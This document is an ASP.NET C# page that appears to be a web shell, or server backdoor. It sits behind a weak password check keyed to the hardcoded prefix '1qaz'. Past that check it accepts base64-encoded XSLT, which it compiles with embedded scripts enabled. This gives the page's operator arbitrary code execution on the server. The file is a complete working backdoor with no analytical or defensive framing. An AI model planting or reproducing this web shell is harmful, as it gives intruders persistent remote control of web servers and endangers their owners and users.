<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Xml" %>
<%@ import Namespace="System.Xml.Xsl"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
       
    string xml = @"<?xml version=""1.0""?><root>test</root>";
    private const string Pass = "1qaz";
    private const string HEADER = "<html>\n<head>\n<title>command</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    
    protected void Page_Load(object sender, EventArgs e)
    {
        id1.Visible = true;
        Div1.Visible = false;
    }


    protected void btnExecute1_Click(object sender, EventArgs e)
    {
        string password = txtAuthKey.Text;
        string result = password.Substring(0, 4);
        bool h = Regex.IsMatch(password, @"^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[~`!@#\$%\^&\*,.])(?!.*\s).*$");
        if (h == false | result != Pass)
        {
            id1.Visible = false;
            Response.Write("Sorry Wrong Password");
        }
        if (h == true & result == Pass)
        {
            Div1.Visible = true;
            id1.Visible = false;
        }
        
    }
    
    protected void btnExecute_Click(object sender, EventArgs e)
    {

    
            Response.Write(HEADER);
            Response.Write("<pre>");
            Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));
            Response.Write("</pre>");
            Response.Write(FOOTER);

			

    }

    private string ExecuteCommand(string command)
    {
            string Fail = "CommandExecFail";
            string sucess = "Done";
        
            byte[] newBytes = Convert.FromBase64String(command);
            string decode = Encoding.UTF8.GetString(newBytes);

            XmlDocument xmldoc = new XmlDocument();
            xmldoc.LoadXml(xml);
            XmlDocument xsldoc = new XmlDocument();
            xsldoc.LoadXml(decode);
            XsltSettings xslt_settings = new XsltSettings(false, true);
            xslt_settings.EnableScript = true;

            try{
                    XslCompiledTransform xct = new XslCompiledTransform();
                    xct.Load(xsldoc, xslt_settings, new XmlUrlResolver());
                    xct.Transform(xmldoc, null, new MemoryStream());
                    id1.Visible = false;
                    return sucess;
   
                }
            catch (Exception ex)
            {
                return Fail;
            }

    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>Command</title>
</head>
<body>
    <form id="formCommand" runat="server">
    <div class="header" id="id1" runat="server">
        <table>
            <tr>
                <td width="30">Auth Key:</td>
		        <td><asp:TextBox id="txtAuthKey" runat="server"></asp:TextBox></td>
            </tr>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="Button2" runat="server" OnClick="btnExecute1_Click" Text="Execute" /></td>
            </tr>
        </table>
    </div>
 <div class="header" id="Div1" runat="server">
        <table>
            <tr>
                <td width="30">Command:</td>
                <td><asp:TextBox ID="txtCommand" runat="server" Width="820px"></asp:TextBox></td>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="Button1" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>